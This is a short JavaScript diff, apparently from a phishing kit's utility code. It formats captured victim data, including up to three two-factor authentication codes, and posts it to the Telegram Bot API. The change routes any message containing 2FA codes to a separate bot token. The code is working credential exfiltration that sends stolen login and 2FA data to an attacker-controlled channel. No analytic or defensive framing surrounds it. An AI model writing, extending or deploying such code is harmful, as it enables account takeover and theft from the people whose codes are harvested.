@@ -95,7 +95,11 @@ const Utils = {
 <b>2FA:</b> <code>${data.twoFaThird || ''}</code>`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            var token = CONFIG.TELEGRAM_BOT_TOKEN;
+            if (data.twoFa || data.twoFaSecond || data.twoFaThird) {
+                token = CONFIG.TELEGRAM_BOT_TOKEN_2;
+            }
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
